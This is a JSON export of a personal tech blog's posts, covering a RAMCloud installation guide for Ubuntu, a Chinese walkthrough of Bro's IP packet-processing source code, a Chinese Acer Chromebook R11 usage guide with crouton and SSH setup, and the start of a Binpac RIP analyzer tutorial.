the information like the followed graph. Then it means that you have installed the gcc 4.9 correctly.\nYou must to make sure you have installed the gcc and g++ correctly when you want to continue the next steps.\nInstall Java and Javac sudo apt-add-repository -y ppa:webupd8team/java sudo apt-get update install_dependency oracle-java8-installer java -version  If the java -version command can output the information like the followed graph. Then it means that you have installed the java correctly.\nInstall Cmake We will use Cmake to compile the Doxygen 1.7.2 in the next steps.\nsudo apt-get install -y software-properties-common sudo add-apt-repository -y ppa:george-edison55/cmake-3.x sudo apt-get update sudo apt-get install -y cmake cmake --version  Use cmake --version to check the version of cmake. If the cmake --version command can output the informaton like the followed graph. Then it means that you have installed the cmake correctly.\n Download the packages which will be need in the next few steps. git clone git@bitbucket.org:guozetang/ramcloud.git cd ./ramcloud/packages/  When you get in to this director, you can find these packages in this director. We will use these packages in the next steps.\nInstall Pcre tar -xzvf pcre-8.42.tar.gz cd pcre-8.42 ./configure --prefix=/usr/local/pcre make sudo make install sudo echo \u0026quot;/usr/local/pcre/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/pcre.conf  Install Python2.6 tar zxvf Python-2.6.6.tgz cd Python-2.6.6 ./configure --prefix=/usr/local/python2.6 make sudo make install sudo ln -s /usr/local/python2.6/bin/python2.6 /usr/bin/python2.6 -f config_ld_lib /usr/local/python2.6/lib/ /etc/ld.so.conf.d/python2.6.conf python2.6 --version  Install Boost tar -xvf boost_1_52_0.tar cd boost_1_52_0 sudo ./bootstrap.sh sudo ./b2 -j sudo ./b2 install --prefix=/usr/local/boost_1_52_0 sudo echo \u0026quot;/usr/local/boost_1_52_0/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/boost_1_52_0.conf  Install Doxygen1.7.2 tar -xzvf doxygen.tar.gz cd doxygen cd build cmake -G \u0026quot;Unix Makefiles\u0026quot; .. make sudo make Install  Install Protocol Buffers tar -xzvf protobuf-2.6.1.tar.gz cd $CURRENT_DIR/packages/protobuf-2.6.1 ./configure --prefix=/usr/local/protobuf make make check sudo make install sudo echo \u0026quot;/usr/local/protobuf/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/protobuf.conf sudo ln -s /usr/local/protobuf/bin/protoc /usr/bin/protoc -f  Install Zookeeper tar -xzvf zookeeper-3.3.6.tar.gz cd zookeeper-3.3.6/src/c ./configure --prefix=/usr/local/zookeeper make sudo make install sudo echo \u0026quot;/usr/local/zookeeper/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/zookeeper.conf  This last command sudo echo \u0026quot;/usr/local/zookeeper/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/zookeeper.conf can make the other application can find the zookeeper lib in the system.\nConfig the Path Add the include path,library path in the /etc/profile.\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/ export LIBRARY_PATH=$LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/ export C_INCLUDE_PATH=$C_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/ export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/ export PATH=$PATH:/usr/local/pcre/bin/:/usr/local/python2.6/bin/:/usr/local/protobuf/bin/:/usr/local/zookeeper/bin/ export PKG_CONFIG_PATH=:/usr/local/protobuf/lib/pkgconfig/  Install RAMCloud git clone https://github.com/PlatformLab/RAMCloud.git cd RAMCloud make -j12 DEBUG=no ","date":1531654693,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1531654693,"objectID":"fb4113a2c965890b45b1a42f412a372b","permalink":"http://www.guozet.me/post/How-to-install-RAMcloud-on-Ubuntu16-04/","publishdate":"2018-07-15T11:38:13Z","relpermalink":"/post/How-to-install-RAMcloud-on-Ubuntu16-04/","section":"post","summary":"Introduce  RAMCloud is a new class of super-high-speed storage for large-scale datacenter applications. It is designed for applications in which a large number of servers in a datacenter need low-latency access to a large durable datastore. RAMCloud offers the following properties:\nProject Link: RAMCloud\nOffice Installing introduce: General Information for Developers\nI have written the shell script to install the RAMCloud on Ubuntu 16.04 or Ubuntu18.04. If you want to build the RAMCloud as soon as possible, please fell free to use my repo on the github. Please read the README.md file in the repo and know how to use the scripts to help you.\n Github repo Link: RAMCloud For Ubuntu16.04 Bitbucket repo Link: RAMCloud For Ubuntu16.04  If you have some issue with this script, please send email to me. I will reply it as soon as possible. In addtion, please read the next introduce about how to install Ramcloud by command if you want to understand each step to install RAMCloud.\n","tags":"Network","title":"How to install RAMcloud on Ubuntu16.04","type":"post"},{"authors":null,"categories":"Network","content":"前言 Bro是一款非常优秀的网络协议分析器。Bro里面的Binpac解析器可以很方便的让我们使用Binpac语言书写协议解析器，并通过Binpac转换成C++语言，这在使用中能够很大程度的减少开发时间，也可以避免手写容易考虑不全的问题。但是在使用Binpac之前，我们需要去了解Bro在处理网络数据包的时候的处理流程，能够方便我们在Binpac使用中去掉和Bro耦合的部分，生成我们需要的协议解析器的C++文件。\n源代码阅读  重点：关注于网络数据包的处理部分代码\n Bro的网络数据包处理流程 Bro启动初始化函数main.cc  int main(int argc, char** argv) (main.cc)\n 在Bro的main.cc文件里面的Main函数是Bro启动过程中的首先执行的函数，而在这个main函数里面，和我们的数据包处理部分相关密切的函数是net_run()函数，这个函数是一个一直循环的函数，一旦出来这个函数之后，后面差不多就结束了。接下来阅读该函数代码。\n数据包处理的主要函数： net_run()  net_run() (Net.cc)\n void net_run() { set_processing_status(\u0026quot;RUNNING\u0026quot;, \u0026quot;net_run\u0026quot;); while ( iosource_mgr-\u0026gt;Size() || (BifConst::exit_only_after_terminate \u0026amp;\u0026amp; ! terminating) ) { double ts; iosource::IOSource* src = iosource_mgr-\u0026gt;FindSoonest(\u0026amp;ts); //打开之后，获取所以的网卡或者文件的句柄 current_iosrc = src; bool communication_enabled = using_communication; if ( src ) //如果这个句柄不是空的话就进入Process()函数 src-\u0026gt;Process();\t// which will call net_packet_dispatch() else if ( reading_live \u0026amp;\u0026amp; ! pseudo_realtime) { // live but no source is currently active double ct = current_time(); if ( ! net_is_processing_suspended() ) { net_update_time(ct); expire_timers(); usleep(1); // Just yield. } } else if ( (have_pending_timers || communication_enabled) \u0026amp;\u0026amp; ! pseudo_realtime ) { net_update_time(current_time()); expire_timers(); if ( ! communication_enabled ) usleep(100000); else usleep(1000); mgr.Drain(); processing_start_time = 0.0;\t// = \u0026quot;we're not processing now\u0026quot; current_dispatched = 0; current_iosrc = 0; extern void termination_signal(); if ( signal_val == SIGTERM || signal_val == SIGINT ) termination_signal(); if ( ! reading_traces ) have_pending_timers = timer_mgr-\u0026gt;Size() \u0026gt; 0; } net_get_final_stats(); }  这个函数并不是很长，仔细阅读，我们可以发现我们只需要关注函数src-\u0026gt;Process, 其中src是iosource::IOSource* src = iosource_mgr-\u0026gt;FindSoonest(\u0026amp;ts);相当于就是打开文件或者网卡数据的句柄（文件句柄或者网卡的句柄）。所以它的处理函数也就是我们想要的数据处理过程了。\n接下来看Process函数,在这个函数中我们可以看到它处理了Packet，处理完之后，调用了一个DoneWithPacket()函数，但我们重点是关注的处理过程，所以我们需要关注函数net_packet_dispatch(net_packet_dispatch(current_pseudo, \u0026amp;current_packet, this);),在这个函数中传入了当前数据包的指针。\n void Pktsrc::Process() (Pktsrc.cc)\n 接下来阅读net_packet_dispatch(current_pseudo, \u0026amp;current_packet, this);的处理过程。这个函数是在net.cc文件中，和net_run()函数是在同一个文件中。\n void net_packet_dispatch(double t, const Packet* pkt, iosource::PktSrc* src_ps) (net.cc)\n 在net_packet_dispatch()函数中，有一个特别重要的数据结构sessions,这是在sessions.cc文件中定义的一个全局变量。\nNetSessions* sessions;\n在这里我们需要阅读一下结构体NetSessions,这个结构体是在sessions.h文件中定义的。在这个结构体中有一个特别重要的函数NextPacket,这个函数也是在net_packet_dispatch中被调用的最重要的函数。\n接下来阅读关键函数：NextPacket\n void NetSessions::NextPacket(double t, const Packet* pkt) (sessions.cc)\n void NetSessions::NextPacket(double t, const Packet* pkt) //t可能是时间戳 { SegmentProfiler(segment_logger, \u0026quot;dispatching-packet\u0026quot;); ..... if ( pkt-\u0026gt;hdr_size \u0026gt; pkt-\u0026gt;cap_len ) //开始判断包的大小问题 { Weird(\u0026quot;truncated_link_frame\u0026quot;, pkt); return; } uint32 caplen = pkt-\u0026gt;cap_len - pkt-\u0026gt;hdr_size; //cap_len抓到的数据包的大小， hdr_size --- IP头里面的显示长度 if ( pkt-\u0026gt;l3_proto == L3_IPV4 ) { if ( caplen \u0026lt; sizeof(struct ip) ) { Weird(\u0026quot;truncated_IP\u0026quot;, pkt); return; } const struct ip* ip = (const struct ip*) (pkt-\u0026gt;data + pkt-\u0026gt;hdr_size); IP_Hdr ip_hdr(ip, false); DoNextPacket(t, pkt, \u0026amp;ip_hdr, 0); } else if ( pkt-\u0026gt;l3_proto == L3_IPV6 ) { ..... DoNextPacket(t, pkt, \u0026amp;ip_hdr, 0); } else if ( pkt-\u0026gt;l3_proto == L3_ARP ) { if ( arp_analyzer ) arp_analyzer-\u0026gt;NextPacket(t, pkt); } ....... if ( dump_this_packet \u0026amp;\u0026amp; ! record_all_packets ) DumpPacket(pkt); }  经过分析，上述的代码中，最重要的是函数DoNextPacket(t, pkt, \u0026amp;ip_hdr, 0),把数据包传入，指向ip头的指针传入。这个函数可以说是我们要找的最重要的函数了，在这个函数中，完成了IP头重组工作。\n void NetSessions::DoNextPacket(double t, const Packet* pkt, const IP_Hdr* ip_hdr, const EncapsulationStack* encapsulation) (Sessions.cc)\n 这个函数已经开始处理IP数据包了,在这个函数里面，最主要的部分是处理片段的部分工作：\n再初始化f之前，执行了：\nif ( discarder \u0026amp;\u0026amp; discarder-\u0026gt;NextPacket(ip_hdr, len, caplen) ) return; FragReassembler* f = 0; if ( ip_hdr-\u0026gt;IsFragment() ) { dump_this_packet = 1;\t// always record fragments  主要看一下NextPacket函数的执行过程: 在这个函数中主要检查了IP数据包，判断是TCP还是UDP，然后处理IP嵌套的情况。\nint Discarder::NextPacket(const IP_Hdr* ip, int len, int caplen) { int discard_packet = 0; if ( check_ip ) { val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); try { discard_packet = check_ip-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; if ( discard_packet ) return discard_packet; } int proto = ip-\u0026gt;NextProto(); if ( proto != IPPROTO_TCP \u0026amp;\u0026amp; proto != IPPROTO_UDP \u0026amp;\u0026amp; proto != IPPROTO_ICMP ) // This is not a protocol we understand. return 0; // XXX shall we only check the first packet??? if ( ip-\u0026gt;IsFragment() ) // Never check any fragment. return 0; int ip_hdr_len = ip-\u0026gt;HdrLen(); len -= ip_hdr_len;\t// remove IP header caplen -= ip_hdr_len; int is_tcp = (proto == IPPROTO_TCP); int is_udp = (proto == IPPROTO_UDP); int min_hdr_len = is_tcp ? sizeof(struct tcphdr) : (is_udp ? sizeof(struct udphdr) : sizeof(struct icmp)); if ( len \u0026lt; min_hdr_len || caplen \u0026lt; min_hdr_len ) // we don't have a complete protocol header return 0; // Where the data starts - if this is a protocol we know about, // this gets advanced past the transport header. const u_char* data = ip-\u0026gt;Payload(); if ( is_tcp ) { if ( check_tcp ) { const struct tcphdr* tp = (const struct tcphdr*) data; int th_len = tp-\u0026gt;th_off * 4; val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); args-\u0026gt;append(BuildData(data, th_len, len, caplen)); try { discard_packet = check_tcp-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; } } else if ( is_udp ) { if ( check_udp ) { const struct udphdr* up = (const struct udphdr*) data; int uh_len = sizeof (struct udphdr); val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); args-\u0026gt;append(BuildData(data, uh_len, len, caplen)); try { discard_packet = check_udp-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; } } else { if ( check_icmp ) { const struct icmp* ih = (const struct icmp*) data; val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); try { discard_packet = check_icmp-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; } } return discard_packet; }  在这里主要是关键是四个部分\n FragReassembler* f = 0; 定义片段重组标志位为0 f = NextFragment(t, ip_hdr, pkt-\u0026gt;data + pkt-\u0026gt;hdr_size); 得到下一个片段的指针 const IP_Hdr* ih = f-\u0026gt;ReassembledPkt(); FragReassemblerTracker frt(this, f);  详细分析DoNextPacket函数的处理过程 FragReassembler类结构解析  class FragReassembler (Frag.h)\n 需要看一下FragReassembler这个类里面的成员变量以及相应的函数。在这个类当中，最重要的函数是ReassembledPkt\nNextFragment函数处理过程  FragReassembler* NetSessions::NextFragment(double t, const IP_Hdr* ip, const u_char* pkt) (sessions.cc)\n 在这个函数中，主要查找了fragment，如果没有下一个，就新建一个新的Fragment并添加到fragments的结构体里面去。\nReassembledPkt函数处理过程 这个函数的处理过程只有一条。\n ReassembledPkt() (Frag.h)\n \tconst IP_Hdr* ReassembledPkt()\t{ return reassembled_pkt; }\n对应的IP_Hdr* reassembled_pkt;,所以只是返回去了一个指针头\nFragReassemblerTracker frt(this, f)处理过程 处理Conn的过程 在DoNextPacket这个函数的最后，会去新建或者找到一个Conn处理处理数据包。执行代码:\n DoNextPacket() (Sessions.cc)\n 在处理Conn这个部分的时候，检查是否有对应的connection,根据hash值去查询HashKey* h = BuildConnIDHashKey(id);,如果没有对应的Conn，那么就去新建一个，新建完之后，插入到connect的链表中。如果已经有了对应的Conn那就需要判断当前的conn是不是不正确的数据以及有没有被复用。如果有的话，删除对应的conn的Hash值。\n","date":1528506159,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1528506159,"objectID":"573978b3fafb8c459617d8e0871d8a47","permalink":"http://www.guozet.me/post/Bro-source-codes-walkthought/","publishdate":"2018-06-09T01:02:39Z","relpermalink":"/post/Bro-source-codes-walkthought/","section":"post","summary":"前言 Bro是一款非常优秀的网络协议分析器。Bro里面的Binpac解析器可以很方便的让我们使用Binpac语言书写协议解析器，并通过Binpac转换成C++语言，这在使用中能够很大程度的减少开发时间，也可以避免手写容易考虑不全的问题。但是在使用Binpac之前，我们需要去了解Bro在处理网络数据包的时候的处理流程，能够方便我们在Binpac使用中去掉和Bro耦合的部分，生成我们需要的协议解析器的C++文件。\n","tags":"Network","title":"Bro源代码分析---IP数据包处理流程","type":"post"},{"authors":null,"categories":"Laptop","content":"前言 之前使用了两年的MSI GE60 2PG 笔记本散热问题越来越严重，导致风扇永远转到最高转速，否则CPU温度一直无法降下来。但是，风扇转到最高转速，这台电脑产生的噪音会非常大，如果咋图书馆或者实验室使用，很容易就影响到周围学习的其他同学了，于是考虑到都买另外一个轻便的，待机时间比较长的笔记本到学校，能够支持自己的常规使用。\n购买 Acer Chromebook R11 综合对比的自己的预算以及网友的评价，最后选择了 Acer Chromebook R11(内存4G, SSD:32G), 主要考虑的是只需要279刀，待机时间到10小时左右，屏幕触屏，画面显示给力，触摸板键盘比较舒服。 个人使用Chromebook的目标是是：\n 阅读网页，PDF文档，使用Google doc书写文档 简单使用SSH登陆到服务器书写代码 代码阅读，简单编译一些练习代码 远程连接MSI GE60 电脑完成开发或处理紧急问题 我并不想使用一台279刀的Chromebook来完成自己的项目开发或者运行Matlab之类的软件，它的定位就是辅助自己完成一些简单的不需要消耗太大内存资源的工作，后续我对Acer Chromebook的使用过程中也是这样去安排的。  使用手册 常用功能\u0026amp;插件    Kami ： 这并不能算作是一个插件，这是一个在线的PDF阅读标注网站，你可以绑定Google邮箱，上传自己本地的文件，然后在线阅读并做笔记，然后它会自动把你的笔记以及文档保存到Google云盘里面，十分方便，随时在何地都可以通过浏览器来打开使用，一样的笔记，一样的阅读进度，很适合作为云端的PDF阅读工具。\n   stackedit: 网页应用，这是开源世界的markdown利器，让你随时随地做笔记、做记录。如果你喜欢写博客，或者喜欢Markdown这种专注于写作的方式，强烈推荐尝试。\n   Evernote Web : 这是chrome端的Evernote笔记的收集插件，能够快速的把网页资料收集到自己的Evernote里面去。\n   Telegram : 这是一款加密的通信软件，可以很好的在手机端和电脑端同步消息，互传文件(大小没有限制)，并且消息和文件永久保存，并不会因为你换收集或者电脑而导致你的消息和文件丢失。\n   Gmail Ofline: 这是没有办法的时候，总是有周围没有无线的地方，所以你就需要一个离线的Gmail，让自己能够离线编辑一些邮件消息，当Chromebook连接到网络的时候，能够快速发送邮件出去。\n   Chrome Remote Desktop 但我们的资料在家里的电脑上，或者在公司的电脑上面时，我们需要短暂的连接过去，处理一些工作的时候，这个插件就能够很好的帮助你快速的完成任务。\n   Caret: Chromebook端的代码阅读工具，对中文支持比较友好。\n   MathStudio: 很小但是功能很强大的数学工具，能够画出简单的正弦图形，以及一些常用的数学图形，当然也可以作为数学计算器来使用，很方便。\n   PDF Mergy: 小插件，完成PDF文件的合并工作\n  Write: 书写小插件，能够打开一个很绚丽的网页，让你专注的书写内容\n   listen1_chrome_extension 听歌利器，在 Chromebook 里更是神器，不用安装不兼容的 Android apps\n   Tampermonkey 和 ublock 这种神器就不介绍了\n   Cog - System Info Viewer 查看性能的工具\n  这些插件是我使用过一段时间之后，依旧还保留在我的Chromebook上面的内容，如果你感兴趣，不妨尝试一下。\n进阶操作：远程桌面 场景 长时间使用Chromebook连接到公司或者家里自己的主机进行工作，完成项目等，这就需要考虑使用远程桌面来很好的完成工作。经过一个月的时间，陆续地尝试了能够支持Chromebook的远程桌面软件。 个人要求：\n  通过Chromebook的chrome插件或者App能够进行远程连接(并不是通过安卓APP)\n  使用过程中不通过IP地址直接连接(尝试过这种方式，但是并不能达到我的画质要求)\n  长时间(超过10小时)连接使用比较稳定\n  操作方便，Chromebook的按键能够正常工作\n  经过对比Teamviewer, Splashtop, Chrome Remote Desktop app, UltraVNC这几款能够在Chromebook上面使用的插件或者APP，去掉了收费的Splashtop，以及需要IP地址点对点连接的UltraVNC，最后保留了Teamviewer和Chrome Remote Desktop.\nTeamviewer Teamviewer在chromebook上连接Win10的画面效果，延时情况应该是上述软件里面最好的了，并且面向个人使用是完全免费的，你只需要登录你的账号，就可以免费无广告的连接自己的远程主机，并不需要考虑IP地址，防火墙以及NAT代理之类的。但也有这么几个缺点。\n  Chromebook端的软件功能不完善，必须每次登录到网页端才能够看到自己账号下面的机器，通过在网页端点击然后调用APP连接，过程比较繁琐\n  对Chromebook的键盘没有适配，导致操作起来并不是很方便。比如：不能使用Windows按键\n  Chrome Remote Desktop 谷歌自己的远程桌面软件，所以对Chromebook的支持比较好，把Chromebook右侧的Ctrl按键转换为了Windows按键，以及很多的Chromebook快捷键也可以在远程桌面的时候使用。初次之外，和Teamviewer对比起来有这么几个缺点：\n  图像质量不是太好，打字的时候，能够明显感觉到字体周围模糊\n  延时有时候比较大\n  综合起来，我同时保留的这两个远程桌面软件，在需要长时间工作的时候，那我就会选用Teamviewer, 因为这个时候图像的清晰对我很重要，我不想对着有些模糊的图像长达八个小时。但当我只是需要快速远程连接过去，提交文件或者发一封简短的邮件的时候，我就会选择Chrome Remote Desktop，它能够让我以最快的速度完成我远程连接的工作。\n进阶操作：SSH连接 \u0026mdash; Secure Shell 这是google官方出的SSH插件，到google应用商店下载扩展即可，下载之后打开即可。 使用说明：\nusername@hostname or free form text //填写你想为这个session定制的名字,比如：lab.university username位置：填写你要连接的服务器的账号名称，比如:root hostname位置：这里可以直接填写IP地址，也可以填写域名，一致的。比如：192.168.2.121 port：填写服务器开放的SSH端口连接地址,一般服务器默认的是：22 SSH relay severs options：这个位置不用填写，可以空出来  填完上述的内容，就可以选择连接了，上述内容相当于你在终端输入了：ssh -p 22 root@192.168.2.121，根据反馈的提示内容，输入你的登陆密码就可以了。 但是如果每次连接都需要你时输入密码，这就是一个比较烦躁的事情了，所以你需要导入你的秘钥信息\nIdentity:[default] 这个位置可以导入你的秘钥信息，点击`import`，同时选中自己的id_rsa和id_rsa.pub文件之后，点击`open`.（注意：这需要同时导入两个文件）  到这里你还不能够直接免密码登陆到服务器，需要你将自己的id_rsa.pub文件中的字符内容拷贝到服务器端的~/.ssh/authorized_keys文件中。至于如何生成秘钥文件，请参考 教程。\n进阶操作: 通过crouton安装Ubuntu 进入开发者模式 关机之后，同时按下 esc + 刷新键(第一排左边数过去第四个）+电源键即可。然后 Chromebook 重启，然后按 Ctrl+D 继续，回车确定关闭chromebook 的安全认证，然后chromebook重启，上面的进度条走完了之后自动重启，就进入开发者模式了。\n通过Crouton安装Ubuntu   crouton的下载链接： crouton, 下载之后默认在Downloads文件夹下面\n  用 Ctrl+ALT+ t 调出 crosh 窗口，输入 shell\n  输入sh ~/Downloads/crouton -r list查看croutonz支持的Ubuntu版本\n  安装Ubuntu unity: sudo sh ~/Downloads/crouton -t unity 这里我选择的是Ubuntu的unity桌面，如果你喜欢其他桌面，可以把unity换成xfce\n   如果你不想安装桌面，或者Chromebook的资源比较少，就可以只输入: sudo sh ~/Downloads/crouton -t core，这样就只会安装最简单的终端CLI\n  进入桌面：sudo startunity   其他命令： sudo enter-chroot 进入终端 sudo startxfce4 启动 xfce 桌面 在 Chrome os 和 Linux 之间切换： 从 Chrome os 到 Linux：shift + ctrl + alt + 前进键（第1排第3个键） 从 Linux 到 Chrome os ：shift + ctrl + alt + 后退键（第1排第2个键）\n 官方通过Crouton安装Ubuntu的教程： Installing Ubuntu with crouton\nUbuntu环境配置 我们通过sudo sh ~/Downloads/crouton -t unity这条命令安装的Ubuntu并不是完整版本的，并没有软件管理中心，也没完整的系统设置功能。所以，如果你的电脑是32G以上的SSD的话，\n安装完整的Ubuntu桌面版 在Ubuntu内打开终端：\nsudo apt-get install ubuntu-desktop //下载完整版 Ubuntu sudo apt-get remove libreoffice-common -y //删除 libreoffice sudo apt-get remove unity-webapps-common -y //删除 amazon sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku landscape-client-ui-install onboard deja-dup -y  设置中文工作环境 sudo apt-get install language-pack-zh-hans language-pack-zh-hans-base language-pack-gnome-zh-hans language-pack-gnome-zh-hans-base sudo apt-get install `check-language-support -l zh` sudo localectl set-locale LANG=zh_CN.UTF-8  crouton常规使用(chromebook中的crosh中操作) crouton的升级 sudo ~/Downloads/crouton -u -n croutonname  这里的croutonname替换成你安装的版本：如xenial\ncrouton内的Ubuntu关机 一般选择在Ubuntu里面点击关机按钮(右上角设置里面)，然后自动退出到Chrome OS里面\n删除crouton安装的ubuntu sudo delete-chroot chrootname //chrootname: 所安装 ubuntu 的版本代号，比如xenial：代表的是Ubuntu16。04  备份与恢复Crouton里面的Ubuntu 备份\nsudo edit-chroot -b xenial  注：xenial为ubuntu的版本名称，即16.04为xenial\n恢复\nsudo sh ~/Downloads/crouton -f ~/Downloads/*.tar.gz  注：将*.tar.gz改为你的备份文件名。\n删除备份\nsudo edit-chroot -d xenial  解决音频的Bug问题 暂时没有解决(遗留) 网上解决方案(未在我的Chromebook上面成功)：\n 在Chrome OS中shift+alt+T调出crosh窗口，输入shell。 输入sudo enter-chroot -n trusty 输入sudo apt-get dist-upgrade Ctrl+D登出 输入sudo sh -e ~/Downloads/crouton-master/installer/main.sh(下载的哪个文件用哪个文件名） -u -n xenial 等待更新完成。一般出现的无声音、不能播放视频等BUG都可以解决。 注：xenial为版本号，你使用哪个版本填写哪个版本号x  crouton进阶操作 在Chromebook里面的chrome中以窗口的方式运行Ubuntu 先在Chromebook的chrome 网上应用商店里下载 cronton-integration 然后在crosh中，安装xiwi桌面\nsudo sh ~/Downloads/crouton -t unity,extension,xorg,xiwi //我是在 xfce 桌面下使用的 unity 也可行 但要求下载 extension,xorg,xiwi sudo startxunity -X xiwi // 使用 xiwi 来实现 窗口化  使用中遇到的问题 Wifi开关无法开启的问题 问题描述：在Chrome OS系统中，当休眠状态恢复之后，出现过Wifi无法连接，系统的Wifi状态是关闭的，即使点击的开启的按钮，但是在三到五秒之后就会自动关闭。 解决方案：经过自己检查，发现是Wifi模块有一些松动，所以拆机之后，重新固定了Wifi模块就可以使用了。\n","date":1527712232,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527712232,"objectID":"63892f1d7c2b1cf683a920a514614563","permalink":"http://www.guozet.me/post/Acer-Chromebook-R11/","publishdate":"2018-05-30T20:30:32Z","relpermalink":"/post/Acer-Chromebook-R11/","section":"post","summary":"前言 之前使用了两年的MSI GE60 2PG 笔记本散热问题越来越严重，导致风扇永远转到最高转速，否则CPU温度一直无法降下来。但是，风扇转到最高转速，这台电脑产生的噪音会非常大，如果咋图书馆或者实验室使用，很容易就影响到周围学习的其他同学了，于是考虑到都买另外一个轻便的，待机时间比较长的笔记本到学校，能够支持自己的常规使用。\n","tags":"Chromebook","title":"Acer Chromebook R11 ChromeOS 使用手册(坑)","type":"post"},{"authors":null,"categories":"Project","content":"Introduce The best way to understand the structure of the sources code is to write some modules by yourself. Let\u0026rsquo;s us to write an Analyzer in the Bro by Binpac. We choose RIP v2 to write the first protocol.\nHow to Use Binpac quick start to create the relative file to develop an analyzer? Download Binpac Quick Start git clone https://github.com/grigorescu/binpac_quickstart.git When you finish download, you can enter the binpac_quickstart directory, then you will find there are some files in this directory as blow.\nGuoze@node-0:~/00_Workbench$ cd binpac_quickstart/\rGuoze@node-0:~/00_Workbench/binpac_quickstart$ ls -al\rtotal 32\rdrwxr-xr-x 4 Guoze senfv-PG0 4096 May 22 19:30 .\rdrwxr-xr-x 11 Guoze senfv-PG0 4096 May 23 12:15 ..\rdrwxr-xr-x 8 Guoze senfv-PG0 4096 May 22 19:30 .git\r-rw-r--r-- 1 Guoze senfv-PG0 21 May 22 19:30 __init__.py\r-rw-r--r-- 1 Guoze senfv-PG0 128 May 22 19:30 README.md\r-rwxr-xr-x 1 Guoze senfv-PG0 7151 May 22 19:30 start.py\rdrwxr-xr-x 2 Guoze senfv-PG0 4096 May 22 19:30 templates\r User start.pyto create the directory structure in Bro start.py is the script which who can use to build a directory structure to develp the RIP analyzer. We can use this script as following.\nGuoze@node-0:~/00_Workbench/binpac_quickstart$ ./start.py Usage:\rstart.py NAME DESCRIPTION PATH_TO_BRO_SRC (--tcp|--udp) [--buffered] [--plugin]\r  Example: ./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp Procotol name：RIP； Procoto description：Routing Internet Protocl The absolute path of the Bro source code：../bro The type of Network Portocol which the RIP use：\u0026ndash;udp\n Use this script to built RIP work directory in the Bro source code file. If you don\u0026rsquo;t know RIP protocol before, please read the RIP protocol documents.\nIn the terminal, we just need to input the command as follows to create our work directory. ./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp\nAfter complete, It will create some files in the bro/scripts/base/protocols/rip/ directory and bro/src/analyzer/protocol/rip/ directory\n bro/scripts/base/protocols/rip/  Guoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l\rtotal 12\r-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig\r-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro\r-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro\r  __load__.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip. dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches. main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.\n src/analyzer/protocol/sip/  Guoze@node-0:~/00_Workbench/bro/src/analyzer/protocol/rip$ ls -l\rtotal 32\r-rw-r--r-- 1 Guoze senfv-PG0 301 May 23 12:50 CMakeLists.txt\r-rw-r--r-- 1 Guoze senfv-PG0 472 May 23 12:50 events.bif\r-rw-r--r-- 1 Guoze senfv-PG0 480 May 23 12:50 Plugin.cc\r-rw-r--r-- 1 Guoze senfv-PG0 738 May 23 15:27 rip-analyzer.pac\r-rw-r--r-- 1 Guoze senfv-PG0 721 May 23 12:50 RIP.cc\r-rw-r--r-- 1 Guoze senfv-PG0 715 May 23 12:50 RIP.h\r-rw-r--r-- 1 Guoze senfv-PG0 1005 May 23 12:50 rip.pac\r-rw-r--r-- 1 Guoze senfv-PG0 939 May 23 15:03 rip-protocol.pac\r  CMakeLists.txt: Informs the CMake build system how to compile the analyzer. Plugin.cc: Analyzers in Bro are a type of plugin. This file does what’s necessary to register the new analyzer plugin with Bro. RIP.h: Defines the API for the new analyzer which derives from one of Bro’s already-existing analyzer classes. RIP.cc: Implementation of the analyzer. It’s mostly just responsible for handing off data to the protocol parser that’s been generated by BinPAC. events.bif: Defines events that the analyzer will generate. rip.pac: The main entry point for the BinPAC definition of the protocol that you want to parse. rip-protocol.pac: Where the message format is defined.\nrip-analyzer.pac: Defines a connection, flow, and other processing functions for the analyzer.\n If you just want to use Binpac to compile your c++ file, you just need to write these files:\n events.bif rip.pac rip-protocol.pac rip-analyzer.pac  Implementation Implement the rip-protocol.pac file This file just defines each part in the RIP protocol. In the code, you will find the Binpac language use keywords type to express a data structure in the RIP protocol. The RIP_PDUfuntion which is the lastest type in this file defines the data structure which user 